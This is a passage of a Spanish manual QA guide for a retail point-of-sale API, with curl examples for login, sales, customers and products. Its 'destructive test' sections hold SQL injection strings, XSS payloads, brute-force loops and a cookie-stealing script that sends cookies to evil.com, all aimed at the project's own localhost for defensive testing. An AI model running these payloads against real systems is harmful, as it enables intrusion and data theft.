# TITAN POS - Guia de Testing Manual

**Version:** 2.1
**Fecha:** 2026-02-26
**Sistema:** Punto de Venta para tiendas retail en Mexico
**Stack:** FastAPI + asyncpg + PostgreSQL 15 (backend) | Electron + React 19 + TypeScript (frontend)

> **Cambios 2026-02-26:** Bugs criticos de turnos/gastos corregidos (datetime→TEXT).
> Nuevo helper `get_user_id()` centraliza extraccion de user_id del JWT.
> 164/164 tests automatizados pasando. Ver `docs/QA-REPORTE-BUGS-2026-02-25.md`.

---

## Tabla de Contenidos

1. [Requisitos Previos](#1-requisitos-previos)
2. [Flujo de Login](#2-flujo-de-login)
3. [Modulo Ventas - Terminal (F1)](#3-modulo-ventas---terminal-f1)
4. [Modulo Clientes (F2)](#4-modulo-clientes-f2)
5. [Modulo Productos (F3)](#5-modulo-productos-f3)
6. [Modulo Inventario (F4)](#6-modulo-inventario-f4)
7. [Modulo Turnos (F5)](#7-modulo-turnos-f5)
8. [Modulo Reportes (F6)](#8-modulo-reportes-f6)
9. [Modulo Historial (F7)](#9-modulo-historial-f7)
10. [Modulo Ajustes (F8)](#10-modulo-ajustes-f8)
11. [Modulo Estadisticas (F9)](#11-modulo-estadisticas-f9)
12. [Modulo Mermas (F10)](#12-modulo-mermas-f10)
13. [Modulo Gastos (F11)](#13-modulo-gastos-f11)
14. [Como Reportar Bugs](#14-como-reportar-bugs)
15. [Checklist de Regresion](#15-checklist-de-regresion)
16. [Atajos de Teclado](#16-atajos-de-teclado)
17. [Pruebas de Seguridad](#17-pruebas-de-seguridad)
18. [Pruebas de Estres y Rendimiento](#18-pruebas-de-estres-y-rendimiento)
19. [Pruebas de Casos Extremos (Edge Cases)](#19-pruebas-de-casos-extremos-edge-cases)
20. [Pruebas de Compatibilidad y UI](#20-pruebas-de-compatibilidad-y-ui)
21. [Pruebas de Integridad de Datos](#21-pruebas-de-integridad-de-datos)
22. [Pruebas de Recuperacion](#22-pruebas-de-recuperacion)
23. [Pruebas de Archivos y Uploads](#23-pruebas-de-archivos-y-uploads)
24. [Pruebas Exhaustivas de Emojis y Unicode](#24-pruebas-exhaustivas-de-emojis-y-unicode)
25. [Pruebas de Inyeccion en Campos Numericos](#25-pruebas-de-inyeccion-en-campos-numericos)
26. [Pruebas de Sesion y Autenticacion Avanzadas](#26-pruebas-de-sesion-y-autenticacion-avanzadas)
27. [Pruebas de API Directa (Bypass de Frontend)](#27-pruebas-de-api-directa-bypass-de-frontend)
28. [Pruebas de Concurrencia y Race Conditions](#28-pruebas-de-concurrencia-y-race-conditions)
29. [Pruebas de Limites del Sistema](#29-pruebas-de-limites-del-sistema)
30. [Pruebas de Degradacion Graceful](#30-pruebas-de-degradacion-graceful)

---

## 1. Requisitos Previos

### 1.1 Levantar la Base de Datos

```bash
cd /home/uriel/Documentos/PUNTO\ DE\ VENTA/backend
docker compose up -d postgres
```

Verificar que PostgreSQL esta corriendo:

```bash
docker compose ps
# Debe mostrar postgres con estado "healthy"
```

### 1.2 Levantar el Backend

```bash
cd /home/uriel/Documentos/PUNTO\ DE\ VENTA/backend
python3 -m uvicorn main:app --host 0.0.0.0 --port 8000
```

Verificar que el backend responde:

```bash
curl http://localhost:8000/health
```

**Respuesta esperada:**

```json
{
  "status": "healthy",
  "service": "titan-pos"
}
```

> **Nota:** El backend NO usa `--reload`. Si se hacen cambios en el codigo, hay que reiniciar uvicorn manualmente.

### 1.3 Levantar el Frontend

```bash
cd /home/uriel/Documentos/PUNTO\ DE\ VENTA/frontend
npm install   # Solo la primera vez
npm run dev
```

Esto abre la aplicacion Electron en modo desarrollo.

### 1.4 Levantar Todo con Docker Compose (Alternativa)

```bash
cd /home/uriel/Documentos/PUNTO\ DE\ VENTA/backend
docker compose up -d
```

Esto levanta tanto PostgreSQL (puerto 5432) como la API (puerto 8000).

### 1.5 Variables de Entorno Importantes

| Variable | Valor por defecto | Descripcion |
|---|---|---|
| `DATABASE_URL` | `postgresql+asyncpg://titan_user:<TU_PASSWORD>@localhost:5432/titan_pos` | Conexion a la BD |
| `JWT_SECRET` | `<TU_JWT_SECRET>` | Clave para tokens JWT |
| `CORS_ORIGINS` | `*` | Origenes permitidos (LAN local) |
| `DEBUG` | `false` | Modo debug |

### 1.6 URL Base para Pruebas API

Todos los endpoints documentados a continuacion usan como base:

```
http://localhost:8000
```

Los endpoints de modulos estan bajo el prefijo `/api/v1/`.

---

## 2. Flujo de Login

### 2.1 Obtener Token de Autenticacion

**Endpoint:** `POST /api/v1/auth/login`

```bash
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "<TU_PASSWORD>"}'
```

**Respuesta esperada (200 OK):**

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer",
  "expires_in": 28800
}
```

**Guardar el token para usar en peticiones siguientes:**

```bash
export TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

### 2.2 Verificar Token

**Endpoint:** `GET /api/v1/auth/verify`

```bash
curl http://localhost:8000/api/v1/auth/verify \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta esperada (200 OK):**

```json
{
  "success": true,
  "data": {
    "valid": true,
    "user": "1",
    "role": "admin"
  }
}
```

### 2.3 Casos de Error

**Credenciales incorrectas:**

```bash
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "incorrecta"}'
```

**Respuesta esperada (401):**

```json
{
  "detail": "Credenciales invalidas"
}
```

**Token expirado o invalido:**

```bash
curl http://localhost:8000/api/v1/auth/verify \
  -H "Authorization: Bearer token_invalido_aqui"
```

**Respuesta esperada (401):**

```json
{
  "detail": "Token invalido o expirado"
}
```

### 2.4 Prueba en Frontend

1. Abrir la aplicacion Electron
2. Ingresar usuario y contrasena en la pantalla de login
3. Verificar que redirige al dashboard principal
4. Verificar que el nombre del usuario aparece en el header
5. Cerrar sesion y verificar que regresa al login

### 2.5 Pruebas Destructivas (Intentar Romper)

**Inyeccion SQL en campos de login:**

```bash
# Intentar SQL injection en username
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin\" OR 1=1--", "password": "x"}'

curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "'; DROP TABLE users;--", "password": "x"}'

# Debe retornar 401 o 422, NUNCA datos de otro usuario
```

**Valores limite en credenciales:**

```bash
# Username vacio
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "", "password": ""}'

# Username extremadamente largo (10,000 caracteres)
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"$(python3 -c 'print("A"*10000)')\", \"password\": \"x\"}"

# Password con caracteres especiales y unicode
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "🔥💀\\n\\r\\t\\0"}'

# Solo espacios en blanco
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "   ", "password": "   "}'
```

**Manipulacion de tokens:**

```bash
# Token con payload modificado (cambiar role a admin)
# Tomar un token valido, decodificar base64, cambiar "role":"cajero" a "role":"admin", re-encodear
# El backend DEBE rechazarlo porque la firma no coincide

# Token con formato invalido
curl http://localhost:8000/api/v1/auth/verify \
  -H "Authorization: Bearer not.a.jwt"

# Token sin header Authorization
curl http://localhost:8000/api/v1/auth/verify

# Token con tipo incorrecto
curl http://localhost:8000/api/v1/auth/verify \
  -H "Authorization: Basic dXNlcjpwYXNz"

# Token con segmentos extra
curl http://localhost:8000/api/v1/auth/verify \
  -H "Authorization: Bearer a.b.c.d.e"
```

**Fuerza bruta y rate limiting:**

```bash
# Enviar 100 intentos de login rapidos (debe haber rate limiting)
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://localhost:8000/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username": "admin", "password": "wrong'$i'"}'
done
# Verificar: despues de N intentos, debe retornar 429 (Too Many Requests)
```

**Concurrencia en login:**

```bash
# 20 logins simultaneos del mismo usuario
for i in $(seq 1 20); do
  curl -s -X POST http://localhost:8000/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username": "admin", "password": "<TU_PASSWORD>"}' &
done
wait
# Todos deben retornar tokens validos sin errores 500
```

**Content-Type invalido:**

```bash
# Enviar como form-urlencoded en vez de JSON
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=admin&password=test'

# Sin Content-Type
curl -X POST http://localhost:8000/api/v1/auth/login \
  -d '{"username": "admin", "password": "test"}'

# Body vacio
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json"

# JSON malformado
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{username: admin}'
```

---

## 3. Modulo Ventas - Terminal (F1)

### 3.1 Prerequisito: Turno Abierto

Antes de crear ventas, debe existir un turno abierto. Ver [seccion 7](#7-modulo-turnos-f5).

### 3.2 Buscar Producto por SKU/Barcode

**Endpoint:** `GET /api/v1/products/scan/{sku}`

```bash
# Busqueda exacta por SKU
curl http://localhost:8000/api/v1/products/scan/SKU001 \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta cuando se encuentra (200 OK):**

```json
{
  "success": true,
  "data": {
    "found": true,
    "product": {
      "id": 1,
      "sku": "SKU001",
      "name": "Shampoo 400ml",
      "price": 89.90,
      "stock": 25.0
    }
  }
}
```

**Respuesta cuando NO se encuentra (devuelve sugerencias):**

```json
{
  "success": true,
  "data": {
    "found": false,
    "suggestions": [
      {"id": 5, "sku": "SKU010", "name": "Shampoo 200ml", "stock": 10}
    ]
  }
}
```

### 3.3 Listar Productos (para busqueda manual)

**Endpoint:** `GET /api/v1/products/?search=shampoo`

```bash
curl "http://localhost:8000/api/v1/products/?search=shampoo&limit=10" \
  -H "Authorization: Bearer $TOKEN"
```

### 3.4 Crear una Venta - Pago en Efectivo

**Endpoint:** `POST /api/v1/sales/`

```bash
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "items": [
      {
        "product_id": 1,
        "qty": 2,
        "price": 89.90,
        "discount": 0,
        "price_includes_tax": true
      },
      {
        "product_id": 3,
        "qty": 1,
        "price": 45.00,
        "discount": 5.00,
        "price_includes_tax": true
      }
    ],
    "payment_method": "cash",
    "cash_received": 250.00,
    "branch_id": 1,
    "serie": "A"
  }'
```

**Respuesta esperada (200 OK):**

```json
{
  "success": true,
  "data": {
    "id": 42,
    "uuid": "a1b2c3d4-...",
    "folio": "A1-000042",
    "subtotal": 188.62,
    "tax": 30.18,
    "total": 218.80,
    "change": 31.20,
    "payment_method": "cash",
    "status": "completed"
  }
}
```

**Verificaciones post-venta:**
- El campo `change` (cambio) debe ser correcto: `cash_received - total`
- El stock del producto debe haberse reducido
- Se debe haber creado un `inventory_movement` de tipo OUT
- El `folio_visible` debe seguir la secuencia

### 3.5 Crear una Venta - Pago con Tarjeta

```bash
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "items": [
      {"product_id": 1, "qty": 1, "price": 89.90, "price_includes_tax": true}
    ],
    "payment_method": "card",
    "branch_id": 1,
    "serie": "A"
  }'
```

### 3.6 Crear una Venta - Pago Mixto

```bash
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "items": [
      {"product_id": 1, "qty": 3, "price": 100.00, "price_includes_tax": true}
    ],
    "payment_method": "mixed",
    "mixed_cash": 150.00,
    "mixed_card": 158.62,
    "mixed_transfer": 0,
    "branch_id": 1,
    "serie": "A"
  }'
```

**Nota:** La suma de `mixed_cash + mixed_card + mixed_transfer + mixed_wallet + mixed_gift_card` debe ser igual al total (tolerancia de $0.02).

### 3.7 Crear una Venta - Credito

```bash
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "items": [
      {"product_id": 1, "qty": 1, "price": 89.90, "price_includes_tax": true}
    ],
    "payment_method": "credit",
    "customer_id": 1,
    "branch_id": 1,
    "serie": "A"
  }'
```

**Verificaciones:**
- El `customer_id` es obligatorio para ventas a credito
- El cliente debe tener credito habilitado (`credit_authorized = true`)
- El saldo no debe exceder el limite de credito
- Se crea un registro en `credit_history` con tipo `CHARGE`

### 3.8 Consultar Detalle de una Venta

**Endpoint:** `GET /api/v1/sales/{sale_id}`

```bash
curl http://localhost:8000/api/v1/sales/42 \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta incluye la venta completa con sus items.**

### 3.9 Cancelar una Venta

**Endpoint:** `POST /api/v1/sales/{sale_id}/cancel`

> **RBAC:** Solo roles `admin`, `manager`, `owner`, `gerente`, `dueño`.

```bash
curl -X POST http://localhost:8000/api/v1/sales/42/cancel \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta esperada (200 OK):**

```json
{
  "success": true,
  "data": {"id": 42, "status": "cancelled"}
}
```

**Verificaciones post-cancelacion:**
- El stock de los productos se restaura
- Se crean `inventory_movements` de tipo IN/cancellation
- Si fue venta a credito, el saldo del cliente se revierte
- Si fue pago con monedero, el saldo se restaura
- Solo se pueden cancelar ventas con status `completed`

### 3.10 Casos de Error Importantes

**Sin turno abierto:**

```json
{"detail": "No hay turno abierto. Debe abrir un turno antes de crear ventas."}
```

**Stock insuficiente:**

```json
{"detail": "Stock insuficiente para 'Shampoo 400ml'. Disponible: 2, Solicitado: 5"}
```

**Credito sin customer_id:**

```json
{"detail": "Venta a credito requiere customer_id"}
```

**Producto bloqueado por otra venta concurrente:**

```json
{"detail": "Productos bloqueados por otra venta en proceso. Intenta de nuevo."}
```

### 3.11 Prueba en Frontend

1. Presionar **F1** para ir a la terminal de ventas
2. Escanear un codigo de barras o escribir el SKU en el campo de busqueda
3. Verificar que el producto aparece en el carrito
4. Ajustar cantidad si es necesario
5. Seleccionar metodo de pago
6. Para efectivo: ingresar el monto recibido y verificar el cambio calculado
7. Completar la venta
8. Verificar que el ticket se genera correctamente con folio, items, totales e IVA

### 3.12 Pruebas Destructivas (Intentar Romper)

**Cantidades invalidas:**

```bash
# Cantidad cero
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": 0, "price": 89.90, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 100, "branch_id": 1, "serie": "A"}'

# Cantidad negativa
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": -5, "price": 89.90, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 100, "branch_id": 1, "serie": "A"}'

# Cantidad con decimales absurdos
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": 0.0001, "price": 89.90, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 100, "branch_id": 1, "serie": "A"}'

# Cantidad MAX_INT
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": 999999999, "price": 89.90, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 999999999999, "branch_id": 1, "serie": "A"}'
```

**Precios manipulados:**

```bash
# Precio 0
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": 1, "price": 0, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 0, "branch_id": 1, "serie": "A"}'

# Precio negativo (descuento fraudulento?)
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": 1, "price": -50.00, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 0, "branch_id": 1, "serie": "A"}'

# Descuento mayor que el precio
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": 1, "price": 89.90, "discount": 200.00, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 0, "branch_id": 1, "serie": "A"}'
```

**Pagos inconsistentes:**

```bash
# Pago mixto que no suma el total
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": 1, "price": 100.00, "price_includes_tax": true}], "payment_method": "mixed", "mixed_cash": 10, "mixed_card": 10, "branch_id": 1, "serie": "A"}'

# Efectivo recibido menor que el total (sin ser credito)
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": 1, "price": 89.90, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 1.00, "branch_id": 1, "serie": "A"}'

# Pago con metodo inexistente
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": 1, "price": 89.90, "price_includes_tax": true}], "payment_method": "bitcoin", "branch_id": 1, "serie": "A"}'
```

**Condiciones de carrera (Race Conditions):**

```bash
# Dos ventas simultaneas del mismo producto con stock limitado (stock=1)
# Terminal A y Terminal B intentan vender el mismo producto al mismo tiempo
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": 1, "price": 89.90, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 100, "branch_id": 1, "serie": "A"}' &
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": 1, "price": 89.90, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 100, "branch_id": 1, "serie": "A"}' &
wait
# Solo UNA debe tener exito si stock=1. Verificar que stock no quede negativo.
```

**Doble-click / doble envio:**

```bash
# Enviar la misma venta 10 veces en rapida sucesion
for i in $(seq 1 10); do
  curl -s -X POST http://localhost:8000/api/v1/sales/ \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"items": [{"product_id": 1, "qty": 1, "price": 89.90, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 100, "branch_id": 1, "serie": "A"}' &
done
wait
# Verificar: no debe haber ventas duplicadas, stock debe ser consistente
```

**Producto inexistente o desactivado:**

```bash
# product_id que no existe
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 99999, "qty": 1, "price": 10, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 100, "branch_id": 1, "serie": "A"}'

# product_id negativo
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": -1, "qty": 1, "price": 10, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 100, "branch_id": 1, "serie": "A"}'

# Venta con lista de items vacia
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [], "payment_method": "cash", "cash_received": 100, "branch_id": 1, "serie": "A"}'
```

**Inyeccion SQL en busqueda de productos:**

```bash
curl "http://localhost:8000/api/v1/products/scan/'; DROP TABLE products;--" \
  -H "Authorization: Bearer $TOKEN"

curl "http://localhost:8000/api/v1/products/?search=' UNION SELECT * FROM users--" \
  -H "Authorization: Bearer $TOKEN"

curl "http://localhost:8000/api/v1/products/?search=1%27%20OR%201%3D1--" \
  -H "Authorization: Bearer $TOKEN"
```

**Cancelar venta ya cancelada:**

```bash
# Cancelar dos veces la misma venta
curl -X POST http://localhost:8000/api/v1/sales/42/cancel \
  -H "Authorization: Bearer $TOKEN"
# Segunda vez: debe retornar error
curl -X POST http://localhost:8000/api/v1/sales/42/cancel \
  -H "Authorization: Bearer $TOKEN"
```

---

## 4. Modulo Clientes (F2)

### 4.1 Listar Clientes

**Endpoint:** `GET /api/v1/customers/`

```bash
# Listar todos los clientes activos
curl "http://localhost:8000/api/v1/customers/?limit=20" \
  -H "Authorization: Bearer $TOKEN"

# Buscar por nombre, telefono, email o RFC
curl "http://localhost:8000/api/v1/customers/?search=Juan" \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta esperada:**

```json
{
  "success": true,
  "data": [
    {
      "id": 1,
      "name": "Juan Perez",
      "phone": "5551234567",
      "email": "juan@email.com",
      "rfc": "PEPJ800101ABC",
      "credit_limit": 5000.0,
      "credit_balance": 1200.0,
      "is_active": 1
    }
  ]
}
```

### 4.2 Crear Cliente

**Endpoint:** `POST /api/v1/customers/`

```bash
curl -X POST http://localhost:8000/api/v1/customers/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "name": "Maria Garcia Lopez",
    "phone": "5559876543",
    "email": "maria@email.com",
    "rfc": "GALM900515XYZ",
    "address": "Calle Reforma 123, Col. Centro, CDMX",
    "credit_limit": 3000.00,
    "notes": "Cliente frecuente"
  }'
```

**Respuesta esperada (200 OK):**

```json
{"success": true, "data": {"id": 15}}
```

### 4.3 Actualizar Cliente

**Endpoint:** `PUT /api/v1/customers/{customer_id}`

```bash
curl -X PUT http://localhost:8000/api/v1/customers/15 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "phone": "5551112233",
    "credit_limit": 5000.00
  }'
```

> **RBAC:** Cambiar `credit_limit` o `is_active` requiere rol de gerente+.

### 4.4 Desactivar Cliente (Soft-Delete)

**Endpoint:** `DELETE /api/v1/customers/{customer_id}`

> **RBAC:** Solo `admin`, `manager`, `owner`, `gerente`, `dueño`.

```bash
curl -X DELETE http://localhost:8000/api/v1/customers/15 \
  -H "Authorization: Bearer $TOKEN"
```

### 4.5 Consultar Credito del Cliente

**Endpoint:** `GET /api/v1/customers/{customer_id}/credit`

```bash
curl http://localhost:8000/api/v1/customers/1/credit \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta esperada:**

```json
{
  "success": true,
  "data": {
    "customer_id": 1,
    "name": "Juan Perez",
    "credit_limit": 5000.0,
    "credit_balance": 1200.0,
    "available_credit": 3800.0,
    "pending_sales": [
      {"id": 10, "folio": "A1-000010", "total": 600.0, "timestamp": "2026-02-20T14:30:00"}
    ]
  }
}
```

### 4.6 Historial de Compras del Cliente

**Endpoint:** `GET /api/v1/customers/{customer_id}/sales`

```bash
curl "http://localhost:8000/api/v1/customers/1/sales?limit=10" \
  -H "Authorization: Bearer $TOKEN"
```

### 4.7 Prueba en Frontend

1. Presionar **F2** para ir al modulo de clientes
2. Buscar un cliente por nombre o telefono
3. Crear un nuevo cliente con todos los campos
4. Editar un cliente existente (cambiar telefono, email)
5. Verificar el estado de credito del cliente
6. Ver historial de compras

### 4.8 Pruebas Destructivas (Intentar Romper)

**XSS en campos de texto:**

```bash
# Script tag en nombre de cliente
curl -X POST http://localhost:8000/api/v1/customers/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "<script>alert(\"XSS\")</script>", "phone": "5551234567"}'

# Event handler en nombre
curl -X POST http://localhost:8000/api/v1/customers/ \
  -H "Content-Type: application/json" \
  -d '{"name": "<img src=x onerror=alert(1)>", "phone": "5551234567"}'

# XSS en notas
curl -X POST http://localhost:8000/api/v1/customers/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "Test", "notes": "<script>document.location=\"http://evil.com/?c=\"+document.cookie</script>"}'

# Verificar: el nombre debe guardarse como texto plano, no ejecutarse como HTML
```

**Inyeccion SQL en busqueda:**

```bash
curl "http://localhost:8000/api/v1/customers/?search=' OR '1'='1" \
  -H "Authorization: Bearer $TOKEN"

curl "http://localhost:8000/api/v1/customers/?search='; DELETE FROM customers;--" \
  -H "Authorization: Bearer $TOKEN"
```

**Valores limite:**

```bash
# Nombre con 500+ caracteres
curl -X POST http://localhost:8000/api/v1/customers/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"name\": \"$(python3 -c 'print("A"*500)')\", \"phone\": \"5551234567\"}"

# Telefono con letras
curl -X POST http://localhost:8000/api/v1/customers/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "Test", "phone": "abc-not-a-phone"}'

# Email invalido
curl -X POST http://localhost:8000/api/v1/customers/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "Test", "email": "not-an-email"}'

# RFC con formato invalido
curl -X POST http://localhost:8000/api/v1/customers/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "Test", "rfc": "INVALIDO"}'

# Credit limit negativo
curl -X POST http://localhost:8000/api/v1/customers/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "Test", "credit_limit": -5000}'

# Credit limit astronomico
curl -X POST http://localhost:8000/api/v1/customers/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "Test", "credit_limit": 99999999999.99}'

# Emojis en todos los campos
curl -X POST http://localhost:8000/api/v1/customers/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "Cliente 🔥💰🎉", "phone": "📱5551234567", "email": "🎭@email.com", "notes": "👍🏼 Buen cliente 🌟"}'
```

**Credito - casos extremos:**

```bash
# Cliente con credit_limit=0 intentando comprar a credito
# (primero crear cliente con limit 0, luego intentar venta a credito)

# Multiples ventas a credito simultaneas para exceder el limite
for i in $(seq 1 5); do
  curl -s -X POST http://localhost:8000/api/v1/sales/ \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"items": [{"product_id": 1, "qty": 1, "price": 1000, "price_includes_tax": true}], "payment_method": "credit", "customer_id": 1, "branch_id": 1, "serie": "A"}' &
done
wait
# Verificar: el saldo total NO debe exceder el credit_limit
```

**Acceso a clientes de otra sucursal/branch:**

```bash
# Intentar acceder a cliente con ID inexistente
curl http://localhost:8000/api/v1/customers/99999/credit \
  -H "Authorization: Bearer $TOKEN"

# Intentar desactivar cliente con ID 0
curl -X DELETE http://localhost:8000/api/v1/customers/0 \
  -H "Authorization: Bearer $TOKEN"
```

---

## 5. Modulo Productos (F3)

### 5.1 Listar Productos

**Endpoint:** `GET /api/v1/products/`

```bash
# Todos los productos activos
curl "http://localhost:8000/api/v1/products/?limit=50" \
  -H "Authorization: Bearer $TOKEN"

# Buscar por nombre, SKU o barcode
curl "http://localhost:8000/api/v1/products/?search=shampoo" \
  -H "Authorization: Bearer $TOKEN"

# Filtrar por categoria
curl "http://localhost:8000/api/v1/products/?category=Higiene" \
  -H "Authorization: Bearer $TOKEN"
```

### 5.2 Crear Producto

**Endpoint:** `POST /api/v1/products/`

> **RBAC:** Solo `admin`, `manager`, `owner`, `gerente`, `dueño`.

```bash
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "sku": "SHAM-001",
    "name": "Shampoo Anticaspa 400ml",
    "price": 89.90,
    "price_wholesale": 75.00,
    "cost": 45.00,
    "stock": 50,
    "category": "Higiene",
    "department": "Cuidado Personal",
    "provider": "Proveedor ABC",
    "min_stock": 10,
    "max_stock": 200,
    "tax_rate": 0.16,
    "sale_type": "unit",
    "barcode": "7501234567890",
    "description": "Shampoo anticaspa para uso diario"
  }'
```

**Respuesta esperada:**

```json
{"success": true, "data": {"id": 101}}
```

**Validaciones:**
- `sku` es obligatorio y debe ser unico
- `name` es obligatorio
- `price` debe ser >= 0
- Si el SKU ya existe, retorna error 400

### 5.3 Actualizar Producto

**Endpoint:** `PUT /api/v1/products/{product_id}`

```bash
curl -X PUT http://localhost:8000/api/v1/products/101 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "price": 99.90,
    "min_stock": 15
  }'
```

**Verificaciones:**
- Cambios de precio (`price`, `price_wholesale`, `cost`, `tax_rate`) requieren rol gerente+
- Los cambios de precio se registran automaticamente en `price_history`
- Solo se actualizan los campos enviados (los demas quedan sin cambio)

### 5.4 Desactivar Producto (Soft-Delete)

**Endpoint:** `DELETE /api/v1/products/{product_id}`

```bash
curl -X DELETE http://localhost:8000/api/v1/products/101 \
  -H "Authorization: Bearer $TOKEN"
```

### 5.5 Consultar Producto por ID

**Endpoint:** `GET /api/v1/products/{product_id}`

```bash
curl http://localhost:8000/api/v1/products/1 \
  -H "Authorization: Bearer $TOKEN"
```

### 5.6 Consultar Producto por SKU

**Endpoint:** `GET /api/v1/products/sku/{sku}`

```bash
curl http://localhost:8000/api/v1/products/sku/SHAM-001 \
